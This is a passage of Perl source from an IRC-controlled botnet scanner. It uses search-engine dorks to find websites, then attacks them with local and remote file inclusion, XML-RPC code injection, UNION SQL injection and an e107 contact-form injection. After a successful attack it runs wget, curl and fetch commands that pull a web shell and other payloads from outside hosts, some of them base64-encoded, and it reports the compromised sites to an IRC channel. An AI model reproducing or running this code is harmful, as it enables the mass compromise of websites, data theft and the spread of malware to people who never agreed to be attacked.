    if ($engz =~ /szukacz/) {
        my @szukacz=&szukacz($dork);
        push(@total, @szukacz);
    }
    if ($engz =~ /kvasir/) {
        my @kvasir=&kvasir($dork);
        push(@total, @kvasir);
    }
    if ($engz =~ /ixquic/) {
        my @ixquic=&ixquic($dork);
        push(@total, @ixquic);
    }
    if ($engz =~ /libero/) {
        my @libero=&libero($dork);
        push(@total, @libero);
    }
    if ($engz =~ /tiscali/) {
        my @tiscali=&tiscali($dork);
        push(@total, @tiscali);
    }
    if ($engz =~ /gigablast/) {
        my @gigablast=&gigablast($dork);
        push(@total, @gigablast);
    }
    if ($engz =~ /sapo/) {
        my @sapo=&sapo($dork);
        push(@total, @sapo);
    }
    if ($engz =~ /naver/) {
        my @naver=&naver($dork);
        push(@total, @naver);
    }
    if ($engz =~ /rediff/) {
        my @rediff=&rediff($dork);
        push(@total, @rediff);
    }
    if ($engz =~ /walla/) {
        my @walla=&walla($dork);
        push(@total, @walla);
    }
    if ($engz =~ /aol/) {
        my @aol=&aol($dork);
        push(@total, @aol);
    }
    my @clean = &calculate(@total);
    if (scalar(@clean) != 0) {
    }
    my $uni=scalar(@clean);
    foreach my $target (@clean) {
	$contatore++;
    if ($contatore==$uni-1){
    }
        my $lfi  = "../../../../../../../../../../../../../../..";
        my $xpl  = "http://".$target.$bugz.$rspo_test;
        my $vuln = "http://".$target." 12".$bugz." ";
        my $re   = getcontent($xpl);
        if ($re  =~ /DOCUMENT_ROOT=\// && $re =~ /HTTP_USER_AGENT/){
            if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                my $rspo = lfiexploit($xpl,"uname -svnrp;echo J13mb0T;id");
                $rspo =~ s/\n//g;
                if ($rspo =~ /j13mb0t#(.*)J13mb0Tuid=(.*)#j13mb0t/sg) {
                    my $sys = $1;
		    my $lfispread	= "cd /tmp;wget ".$perl." -O seka.txt;perl seka.txt;rm -rf *.txt*;wget ".$perl2." -O seka.txt;perl seka.txt;rm -rf *.txt*;wget ".$php." -O alat.txt;php alat.txt;rm -rf alat.txt*";
                    my $tmp = "mailt.php";
                    my $upload = lfiexploit($xpl,"wget $rspo_shell -O $tmp;$lfispread"); sleep(1);
                    my $res = getcontent("http://".$target.'/mailt.php');
                    if ($res =~ /Welcom To The Hell/) {
                        sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12$engz15><4@12mantab15> 4http://".$target."/mailt.php 3".$sys." ");
                        sendraw($IRC_cur_socket, "PRIVMSG $runner : 15< 4@ 12$engz15><4@12mantab15> 4http://".$target."/mailt.php 3".$sys." ");
                    }
                    else {
                        sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12$engz15><4@12system15> 12http://".$target."12".$bugz." 3".$sys." ");
                    }
                }
                else {
                }

            } exit } sleep(3);
        }
    }
}
#####################################################################
#######################      Procedure XML      #####################
#####################################################################
sub scanerxml() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /google/) {
        my @google=&google($dork);
        push(@total, @google);
        }
    if ($engz =~ /gfind/) {
        my @gfind=&google2($dork);
        push(@total, @gfind);
        }
    if ($engz =~ /alltheweb/) {
        my @alltheweb=&alltheweb($dork);
        push(@total, @alltheweb);
        }
    if ($engz =~ /altavista/) {
        my @altavista=&altavista($dork);
        push(@total, @altavista);
        }
    if ($engz =~ /yahoo/) {
        my @yahoo=&yahoo($dork);
        push(@total, @yahoo);
        }
    if ($engz =~ /msn/) {
        my @msn=&msn($dork);
        push(@total, @msn);
        }
    if ($engz =~ /virgillio/) {
        my @virgillio=&virgillio($dork);
        push(@total, @virgillio);
        }
    if ($engz =~ /ask/) {
        my @ask=&ask($dork);
        push(@total, @ask);
        }
    if ($engz =~ /uol/) {
        my @uol=&uol($dork);
        push(@total, @uol);
        }
    if ($engz =~ /lycos/) {
        my @lycos=&lycos($dork);
        push(@total, @lycos);
    }
    if ($engz =~ /snz/) {
        my @snz=&snz($dork);
        push(@total, @snz);
    }
    if ($engz =~ /seznam/) {
        my @seznam=&seznam($dork);
        push(@total, @seznam);
    }
    if ($engz =~ /szukacz/) {
        my @szukacz=&szukacz($dork);
        push(@total, @szukacz);
    }
    if ($engz =~ /kvasir/) {
        my @kvasir=&kvasir($dork);
        push(@total, @kvasir);
    }
    if ($engz =~ /ixquic/) {
        my @ixquic=&ixquic($dork);
        push(@total, @ixquic);
    }
    if ($engz =~ /libero/) {
        my @libero=&libero($dork);
        push(@total, @libero);
    }
    if ($engz =~ /tiscali/) {
        my @tiscali=&tiscali($dork);
        push(@total, @tiscali);
    }
    if ($engz =~ /gigablast/) {
        my @gigablast=&gigablast($dork);
        push(@total, @gigablast);
    }
    if ($engz =~ /sapo/) {
        my @sapo=&sapo($dork);
        push(@total, @sapo);
    }
    if ($engz =~ /naver/) {
        my @naver=&naver($dork);
        push(@total, @naver);
    }
    if ($engz =~ /rediff/) {
        my @rediff=&rediff($dork);
        push(@total, @rediff);
    }
    if ($engz =~ /walla/) {
        my @walla=&walla($dork);
        push(@total, @walla);
    }
    if ($engz =~ /aol/) {
        my @aol=&aol($dork);
        push(@total, @aol);
    }
    my @clean = &calculate(@total);
    if (scalar(@clean) != 0) {
    }
    my $uni=scalar(@clean);
    foreach my $target (@clean) {
	$contatore++;
    if ($contatore==$uni-1){
    }
        my $xpl 	= "http://".$target.$bugz;
	my $xmlupload = "http://".$xmltarget."mailt.php";
	my $xmlsprd 	= "wget ".$rspo_shell." -O mailt.php;chmod 755 mailt.php;lwp-download ".$rspo_shell." -O mailt.php;chmod 755 mailt.php;fetch ".$rspo_shell." -O mailt.php;chmod 755 mailt.php;cd /tmp;wget ".$perl." -O seka.txt;perl seka.txt;rm -rf *.txt*;wget ".$perl2." -O seka.txt;perl seka.txt;rm -rf *.txt*;wget ".$php." -O seka.txt;php alat.txt;rm -rf alat.txt*";
        my $strona 	= getcontent($xpl);
        if ( $strona 	=~ /faultCode/ ) {
			&xmlcek($xpl,$engz);
			&xmlupld($xmlupload);
			&xmlxspread($xpl,$xmlsprd);
                        sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12$engz15> 12$xpl 14 $os  ");
			}
	}
}

#####################################################################
#######################      Procedure RFI      #####################
#####################################################################
sub scanerrfi() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /google/) {
        my @google=&google($dork);
        push(@total, @google);
        }
    if ($engz =~ /gfind/) {
        my @gfind=&google2($dork);
        push(@total, @gfind);
        }
    if ($engz =~ /alltheweb/) {
        my @alltheweb=&alltheweb($dork);
        push(@total, @alltheweb);
        }
    if ($engz =~ /altavista/) {
        my @altavista=&altavista($dork);
        push(@total, @altavista);
        }
    if ($engz =~ /yahoo/) {
        my @yahoo=&yahoo($dork);
        push(@total, @yahoo);
        }
    if ($engz =~ /msn/) {
        my @msn=&msn($dork);
        push(@total, @msn);
        }
    if ($engz =~ /virgillio/) {
        my @virgillio=&virgillio($dork);
        push(@total, @virgillio);
        }
    if ($engz =~ /ask/) {
        my @ask=&ask($dork);
        push(@total, @ask);
        }
    if ($engz =~ /uol/) {
        my @uol=&uol($dork);
        push(@total, @uol);
        }
    if ($engz =~ /lycos/) {
        my @lycos=&lycos($dork);
        push(@total, @lycos);
    }
    if ($engz =~ /snz/) {
        my @snz=&snz($dork);
        push(@total, @snz);
    }
    if ($engz =~ /seznam/) {
        my @seznam=&seznam($dork);
        push(@total, @seznam);
    }
    if ($engz =~ /szukacz/) {
        my @szukacz=&szukacz($dork);
        push(@total, @szukacz);
    }
    if ($engz =~ /kvasir/) {
        my @kvasir=&kvasir($dork);
        push(@total, @kvasir);
    }
    if ($engz =~ /ixquic/) {
        my @ixquic=&ixquic($dork);
        push(@total, @ixquic);
    }
    if ($engz =~ /libero/) {
        my @libero=&libero($dork);
        push(@total, @libero);
    }
    if ($engz =~ /tiscali/) {
        my @tiscali=&tiscali($dork);
        push(@total, @tiscali);
    }
    if ($engz =~ /gigablast/) {
        my @gigablast=&gigablast($dork);
        push(@total, @gigablast);
    }
    if ($engz =~ /sapo/) {
        my @sapo=&sapo($dork);
        push(@total, @sapo);
    }
    if ($engz =~ /naver/) {
        my @naver=&naver($dork);
        push(@total, @naver);
    }
    if ($engz =~ /rediff/) {
        my @rediff=&rediff($dork);
        push(@total, @rediff);
    }
    if ($engz =~ /walla/) {
        my @walla=&walla($dork);
        push(@total, @walla);
    }
    if ($engz =~ /aol/) {
        my @aol=&aol($dork);
        push(@total, @aol);
    }
    my @clean = &calculate(@total);
    if (scalar(@clean) != 0) {
    }
    my $uni=scalar(@clean);
    foreach my $target (@clean) {
	$contatore++;
    if ($contatore==$uni-1){
    }
        my $xpl  = "http://".$target.$bugz.$rfiid;
	my $inj	    = "http://".$target." 12".$bugz." 9injector??";
	my $spd  = "http://".$target.$bugz.$php."?";
        my $re   = getcontent($xpl);
        if ($re  =~ /BaMbY/){
			getcontent($spd);
			os($xpl);
			sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12$engz15> 12$inj14 $os  ");
			}
	}
}
#####################################################################
#######################      Procedure SQL      #####################
#####################################################################
sub scanersql() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /google/) {
        my @google=&google($dork);
        push(@total, @google);
        }
    if ($engz =~ /gfind/) {
        my @gfind=&google2($dork);
        push(@total, @gfind);
        }
    if ($engz =~ /alltheweb/) {
        my @alltheweb=&alltheweb($dork);
        push(@total, @alltheweb);
        }
    if ($engz =~ /altavista/) {
        my @altavista=&altavista($dork);
        push(@total, @altavista);
        }
    if ($engz =~ /yahoo/) {
        my @yahoo=&yahoo($dork);
        push(@total, @yahoo);
        }
    if ($engz =~ /msn/) {
        my @msn=&msn($dork);
        push(@total, @msn);
        }
    if ($engz =~ /virgillio/) {
        my @virgillio=&virgillio($dork);
        push(@total, @virgillio);
        }
    if ($engz =~ /ask/) {
        my @ask=&ask($dork);
        push(@total, @ask);
        }
    if ($engz =~ /uol/) {
        my @uol=&uol($dork);
        push(@total, @uol);
        }
    if ($engz =~ /lycos/) {
        my @lycos=&lycos($dork);
        push(@total, @lycos);
    }
    if ($engz =~ /snz/) {
        my @snz=&snz($dork);
        push(@total, @snz);
    }
    if ($engz =~ /seznam/) {
        my @seznam=&seznam($dork);
        push(@total, @seznam);
    }
    if ($engz =~ /szukacz/) {
        my @szukacz=&szukacz($dork);
        push(@total, @szukacz);
    }
    if ($engz =~ /kvasir/) {
        my @kvasir=&kvasir($dork);
        push(@total, @kvasir);
    }
    if ($engz =~ /ixquic/) {
        my @ixquic=&ixquic($dork);
        push(@total, @ixquic);
    }
    if ($engz =~ /libero/) {
        my @libero=&libero($dork);
        push(@total, @libero);
    }
    if ($engz =~ /tiscali/) {
        my @tiscali=&tiscali($dork);
        push(@total, @tiscali);
    }
    if ($engz =~ /gigablast/) {
        my @gigablast=&gigablast($dork);
        push(@total, @gigablast);
    }
    if ($engz =~ /sapo/) {
        my @sapo=&sapo($dork);
        push(@total, @sapo);
    }
    if ($engz =~ /naver/) {
        my @naver=&naver($dork);
        push(@total, @naver);
    }
    if ($engz =~ /rediff/) {
        my @rediff=&rediff($dork);
        push(@total, @rediff);
    }
    if ($engz =~ /walla/) {
        my @walla=&walla($dork);
        push(@total, @walla);
    }
    if ($engz =~ /aol/) {
        my @aol=&aol($dork);
        push(@total, @aol);
    }
    my @clean = &calculate(@total);
    if (scalar(@clean) != 0) {
    }
    my $uni=scalar(@clean);
    foreach my $target (@clean) {
	$contatore++;
    if ($contatore==$uni-1){
    }
        my $xpl = "http://".$target.$bugz."'";
	my $vuln = "http://".$target." 12".$bugz." 3sqli ";
	my $sqlsite = "http://".$target.$bugz;
        my $strona = getcontent($xpl);
        if ($strona=~ m/You have an error in your SQL syntax/i || $strona=~ m/Query failed/i || $strona=~ m/SQL query failed/i || $strona=~ m/mysql_fetch_/i || $strona=~ m/mysql_fetch_array/i || $strona =~ m/mysql_num_rows/i || $strona =~ m/The used SELECT statements have a different number of columns/i ){
		    &mysqlexplo($sqlsite,$engz);
	    }
		elsif ( $strona =~ m/ODBC SQL Server Driver/i || $strona =~ m/Unclosed quotation mark/i || $strona =~ m/Microsoft OLE DB Provider for/i ){
		}
		elsif ( $strona =~ m/Microsoft JET Database/i || $strona =~ m/ODBC Microsoft Access Driver/i ){
		}
	}
}

sub mysqlexplo(){
    my $sqlsite=$_[0];
	my $engz=$_[1];
    my $columns = 70;
    my $cfin.="--";
    my $cmn.= "+";
    for ($column = 0 ; $column < $columns ; $column ++){
         $union.=','.$column;
         $inyection.=','."0x4279726f654e6574";
        if ($column == 0){
            $inyection = '';
            $union = '';
        }
         $urlsql=$sqlsite."-1".$cmn."union".$cmn."select".$cmn."0x4279726f654e6574".$inyection.$cfin;
         $response=query($urlsql);
        if($response =~ /ByroeNet/){
            $column ++;
            $tampilsql=$sqlsite."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;
            $infosql=$sqlsite."-1".$cmn."union".$cmn."select".$cmn."CONCAT_WS(0x3a,0x4279726f654e6574,database(),user(),version(),@@version_compile_os,0x42614d6259)".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;
            $inforpns=query($infosql);
            if($inforpns =~ /ByroeNet:(.+?):(.+?):(.+?):(.+?)/i){
               my ($db_name,$db_usr,$db_ver,$db_os) = ($1,$2,$3,$4);
               $myinfosql = " 15< 4@ 12DB 15>  12 $db_name 15<4@12User15>12 $db_usr 15<4@12Version15> 12$db_ver 15<4@12ByroeNet15> ";
            }
        sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12$engz15><4@12mantab15> 12$tampilsql $myinfosql ");
        }
    }
}
#####################################################################
#######################      Procedure e107     #####################
#####################################################################
sub scanere107() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /google/) {
        my @e107google=&google($dork);
        push(@e107total, @e107google);
        }
    if ($engz =~ /gfind/) {
        my @e107gfind=&google2($dork);
        push(@e107total, @e107gfind);
    }
    if ($engz =~ /alltheweb/) {
        my @e107alltheweb=&alltheweb($dork);
        push(@e107total, @e107alltheweb);
    }
    if ($engz =~ /virgillio/) {
        my @e107virgillio=&virgillio($dork);
        push(@e107total, @e107virgillio);
    }
    if ($engz =~ /altavista/) {
        my @e107altavista=&altavista($dork);
        push(@e107total, @e107altavista);
    }
    if ($engz =~ /ask/) {
        my @e107ask=&ask($dork);
        push(@e107total, @e107ask);
    }
    if ($engz =~ /uol/) {
        my @e107uol=&uol($dork);
        push(@e107total, @e107uol);
    }
    if ($engz =~ /yahoo/) {
        my @e107yahoo=&yahoo($dork);
        push(@e107total, @e107yahoo);
    }
    if ($engz =~ /msn/) {
        my @e107msn=&msn($dork);
        push(@e107total, @e107msn);
    }
    if ($engz =~ /lycos/) {
        my @e107lycos=&lycos($dork);
        push(@e107total, @e107lycos);
    }
    if ($engz =~ /snz/) {
        my @e107snz=&snz($dork);
        push(@e107total, @e107snz);
    }
    if ($engz =~ /seznam/) {
        my @e107seznam=&seznam($dork);
        push(@e107total, @e107seznam);
    }
    if ($engz =~ /szukacz/) {
        my @e107szukacz=&szukacz($dork);
        push(@e107total, @e107szukacz);
    }
    if ($engz =~ /kvasir/) {
        my @e107kvasir=&kvasir($dork);
        push(@e107total, @e107kvasir);
    }
    if ($engz =~ /ixquic/) {
        my @e107ixquic=&ixquic($dork);
        push(@e107total, @e107ixquic);
    }
    if ($engz =~ /libero/) {
        my @e107libero=&libero($dork);
        push(@e107total, @e107libero);
    }
    if ($engz =~ /tiscali/) {
        my @e107tiscali=&tiscali($dork);
        push(@e107total, @e107tiscali);
    }
    if ($engz =~ /gigablast/) {
        my @e107gigablast=&gigablast($dork);
        push(@e107total, @e107gigablast);
    }
    if ($engz =~ /sapo/) {
        my @e107sapo=&sapo($dork);
        push(@e107total, @e107sapo);
    }
    if ($engz =~ /naver/) {
        my @e107naver=&naver($dork);
        push(@e107total, @e107naver);
    }
    if ($engz =~ /rediff/) {
        my @e107rediff=&rediff($dork);
        push(@e107total, @e107rediff);
    }
    if ($engz =~ /walla/) {
        my @e107walla=&walla($dork);
        push(@e107total, @e107walla);
    }
    if ($engz =~ /aol/) {
        my @e107aol=&aol($dork);
        push(@e107total, @e107aol);
    }
    my @e107clean = &calculate(@e107total);
    if (scalar(@e107clean) != 0) {
    }
    my $uni=scalar(@e107clean);
    foreach my $e107target (@e107clean)
    {
        $contatore++;
        if ($contatore==$uni-1){
        }
		my $cmd = "echo(base64_decode(\"Vm9v\").php_uname().base64_decode(\"RG9v\"));include(base64_decode(\"aHR0cDovL3d3dy5zcGFuaXNobWFuaWEuY2EvcGhwL2hhbmdtYW4vYWxhdC50eHQ==\"));include(base64_decode(\"aHR0cDovL3d3dy5zcGFuaXNobWFuaWEuY2EvcGhwL2hhbmdtYW4vYWxhdC50eHQ==\"));";
		my $ua = LWP::UserAgent->new or die;
		$ua->agent('Mozilla/4.76 [ru] (X11; U; SunOS 5.7 sun4u)');
		$ua->timeout(15);
		my $xpl = "http://".$e107target."/contact.php";
		$xpl =~ s/\/\/contact.php/\/contact.php/g;
		my $req = HTTP::Request->new(POST => $xpl);
		$req->content_type('application/x-www-form-urlencoded');
		$req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
		my $res = $ua->request($req);
		my $cont = $res->content;
			if ($cont =~ /Voo(.*)Doo/) {
				my $uname = $1;
				$uname=~s/\n//;
				$uname=~s/\r//;
				    my $shpld = "http://".$e107target."e107_plugins/mailt.php";
                    my $psres = query($shpld);
                    if ($psres =~ /Welcom To The Hell/) {
                        sendraw($IRC_cur_socket, "PRIVMSG $runner : 15<4@12$engz15><4@12PHPShell15> 4$shpld 14$uname ");
                        sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12$engz15><4@12PHPShell15> 4$shpld 14$uname ");
                    }
                    else {
                        sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12$engz15> 12$xpl 14 $uname  ");
			&spreade107($xpl)
                    }
				
			}
	}
}

sub spreade107() {
my $path = $_[0];
my $incmd = "cd ./e107_plugins/;curl -O http://trolkca.com/assets/images/node.txt;mv node.txt mailt.php; chmod 755 mailt.php; ls -la mailt.php;fetch http://trolkca.com/assets/images/node.txt;mv node.txt mailt.php; chmod 755 mailt.php; ls -la mailt.php; wget http://trolkca.com/assets/images/node.txt;mv node.txt mailt.php; chmod 755 mailt.php; ls -la mailt.php; lwp-download http://trolkca.com/assets/images/node.txt;mv node.txt mailt.php; chmod 755 mailt.php; ls -la mailt.php; pwd ;cd /var/tmp;cd /tmp/;wget ".$perl." -O MT.txt;perl MT.txt;rm -rf *.txt*;wget ".$perl2." -O MT.txt;perl MT.txt;rm -rf *.txt*;wget ".$php." -O alat.txt;php alat.txt;rm -rf alat.txt*;cd /tmp;lwp-download ".$perl." -O MT.txt;perl MT.txt;rm -rf *.txt*;lwp-download ".$perl2." -O MT.txt;perl MT.txt;rm -rf *.txt*;lwp-download ".$php." -O alat.txt;php alat.txt;rm -rf alat.txt*;cd /tmp;curl -f -O ".$perl." -O alat.txt;perl alat.txt;rm -rf *.txt*;curl -f -O ".$perl2." -O MT.txt;perl MT.txt;rm -rf *.txt*;curl -f -O ".$php." -O alat.txt;php alat.txt;rm -rf alat.txt*";
my $codecmd = encode_base64($incmd);
my $cmd = 'echo(base64_decode("QmFNYlk=").shell_exec(base64_decode("aWQ=")).base64_decode("Qnlyb2VOZXQ=")).shell_exec(base64_decode("'.$codecmd.'"))';print $cmd;
$access = new LWP::UserAgent;
$access->agent("Mozilla/5.0");
my $req = new HTTP::Request POST => $path;
   $req->content_type('application/x-www-form-urlencoded');
   $req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
my $res = $access->request($req);
my $data = $res->as_string;
if ( $data =~ /ByroeNet(.*)/ ){
     $mydata = $1;
}
}
##############################################################
##			Peralatan xml			    ##
##############################################################
sub xmlcek {
my $xmltgt = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'j13mb0t';echo`uname -a`;echo'j13mb0t';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $xmltgt, Content_Type => 'text/xml', Content => $exploit);
if ($response->content =~ /j13mb0t(.*)j13mb0t/s) {
$os=$1;
}}
sub xmlxspread() {
my $xmltargt = $_[0];
my $xmlsprd = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'j13m';echo`".$xmlsprd."`;echo'b0T';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $xmltargt, Content_Type => 'text/xml', Content => $exploit);
}
sub xmlupld() {
    my $xmlupload=$_[0];
    $inforpns=query($xmlupload);
    if($inforpns =~ m/Welcom To The Hell/i){
       sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12$engz15><4@12PHPSheLL15>4 $xmlupload  ");
    }
}
##############################################################
##			   cmdlfi   			    ##
##############################################################
sub cmdlfi() {
my $browser = LWP::UserAgent->new;
my $url = $_[0];
my $cmd = $_[1];
my $hie = "j13mbut<?system(\"$cmd 2> /dev/stdout\"); ?>j13mbut";
$browser->agent("$hie");
$browser->timeout(3);
$response = $browser->get( $url );
if ($response->content =~ /j13mbut(.*)j13mbut/s) {
print $1;
sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12lficmd15>> 14$1 ");
}
}
##############################################################
##		     	   cmdxml  			    ##
##############################################################
sub cmdxml() {
my $jed = $_[0];
my $dwa = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'bamby';echo`".$dwa."`;echo'solo';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $jed,Content_Type => 'text/xml',Content => $exploit);
if ($response->content =~ /bamby(.*)solo/s) {
sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12xmlcmd15>> 14$1 ");
}
}
##############################################################
##			   cmde107 			    ##
##############################################################
sub cmde107() {
my $path = $_[0];
my $incmd = $_[1];
my $codecmd = encode_base64($incmd);
my $cmd = 'echo(base64_decode("QmFNYlk=").shell_exec(base64_decode("aWQ=")).base64_decode("Qnlyb2VOZXQ=")).shell_exec(base64_decode("'.$codecmd.'"))';print $cmd;
$access = new LWP::UserAgent;
$access->agent("Mozilla/5.0");
my $req = new HTTP::Request POST => $path;
   $req->content_type('application/x-www-form-urlencoded');
   $req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
my $res = $access->request($req);
my $data = $res->as_string;
if ( $data =~ /ByroeNet(.*)/ ){
     $mydata = $1;
sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12e107cmd15>> 14$mydata  ");
}
}
##############################################################
##			   sub proxy 			    ##
##############################################################
sub proxy() {
	my $port = $_[0];
	my $type = $_[1];
    if ($type =~ m/^(a|anon|anonymous)$/i) { $type = "Anonymous";}
	elsif ($type =~ m/^(e|elite)$/i) { $type = "elite";}
        my $siteproxy = ("http://www.cooleasy.com/index.php?act=list&port=".$port."&type=".$type."&country=United%20States&page=1");
        my $Res = query($siteproxy);
        while ($Res =~ m/<td width=170>(.*)<\/td>/g) {
		my $proip = $1;
		my $scansock = IO::Socket::INET->new(PeerAddr => $proip, PeerPort => $port, Proto =>'tcp', Timeout => 5);
            if ($scansock) {
	            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<<4@12proxy15>> 12$proip:$port 12Type : $type  ");}
        }
	done;
}

sub getcontent() {
    my $url = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(15);
    my $response = $ua->request($req);
    return $response->content;
}

sub lfiexploit() {
    my $url = $_[0];
    my $rce = $_[1];
    my $agent = "<?php echo \"j13mb0t#\"; passthru(\'".$rce."\'); echo \"#j13mb0t\"; ?>";
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout(15);
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}

sub exploit() {
    my $url = $_[0];
    my $rce = $_[1];
    my $agent = "<?php echo \"gmjk#\"; system(\'".$rce."\'); echo \"#gmjk\"; ?>";
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout(5);
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}
sub SIGN() {
if (($powered !~ /s/)||($mail !~ /us/)) {
print "\nLamer!!! Bodoh ToloL Oon !!! Udah Gak Usah diRubah Lagi!!!\n\n"; 
exec("rm -rf $0 && pkill perl");
}
}
##############################################################
##		       38 Search Engine			    ##
##############################################################
sub google(){
my @lst;
my $key = $_[0];
for ($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.com/search?q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}
}
}
return @lst;
}

sub google2(){
my @lst;
my $key = $_[0];
my @dom = ("ad","ae","am","as","at","az","ba","be","bf","bg","bi","bj",
"bs","ca","cat","cd","cf","cg","ch","ci","cl","cm","cn","co.bw","co.ck",
"co.cr","co.id","co.il","co.in","co.jp","co.ke","co.kr","co.ls","com",
"co.ma","com.af","com.ag","com.ai","com.ar","com.au","com.bd","com.bh",
"com.bn","com.bo","com.br","com.by","com.bz","com.co","com.cu","com.do",
"com.ec","com.eg","com.et","com.fj","com.gh","com.gi","com.gt","com.hk",
"com.jm","com.kh","com.kw","com.lb","com.ly","com.mt","com.mx","com.my",
"com.na","com.nf","com.ng","com.ni","com.np","com.om","com.pa","com.pe",
"com.ph","com.pk","com.pr","com.py","com.qa","com.sa","com.sb","com.sg",
"com.sl","com.sv","com.tj","com.tr","com.tw","com.ua","com.uy","com.vc",
"com.vn","co.mz","co.nz","co.th","co.tz","co.ug","co.uk","co.uz","co.ve",
"co.vi","co.za","co.zm","co.zw","cz","de","dj","dk","dm","dz","ee","es",
"fi","fm","fr","ga","ge","gg","gl","gm","gp","gr","gy","hn","hr","ht","vu",
"hu","ie","im","is","it","it.ao","je","jo","kg","ki","kz","la","li","vg",
"lk","lt","lu","lv","md","me","mg","mk","ml","mn","ms","mu","mv","mw","tt",
"ne","nl","no","nr","nu","pl","pn","ps","pt","ro","rs","ru","rw","sc",
"se","sh","si","sk","sm","sn","st","td","tg","tk","tl","tm","to","ws");
for ($b=0;$b<=5000;$b+=100){
my $mygogeldom = $dom[rand(scalar(@dom))];
my $supggl =("http://www.google.".$mygogeldom."/search?q=".key($key)."&num=100&start=".$b);
my $Res=query($supggl);
while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}
}
}
return @lst;
}

sub alltheweb() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    my $pg  = 0;
    for ($b=0; $b<=1000; $b+=100) {
        my $all = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$b);
        my $Res = query($all);
        while ( $Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g ) {
            my $k = $1;
            $k =~ s/ //g;
            my @grep = links($k);
            push( @lst, @grep );
        }
    }
    return @lst;
}
################
sub altavista(){
my @lst;
my $key = $_[0];
my $b   = 0;
for ($b=1; $b<=1000; $b+=10){
my $AlT=("http://nl.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while ($Res=~m/<span class=ngrn>(.+?)\//g){
if ($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}
}
}
return @lst;
}

sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://de.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://us.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}
############
sub yahoo() {
my @lst;
my $key = $_[0];
my $b   = 0;
for ($b=1; $b<=500; $b+=1) {
my $yahoo = ("http://search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
my $Res = query($yahoo);
while ($Res =~ m/26u=(.*?)%26w=/g) {
if ($1 !~ /yahoo/){
my $k = $1;
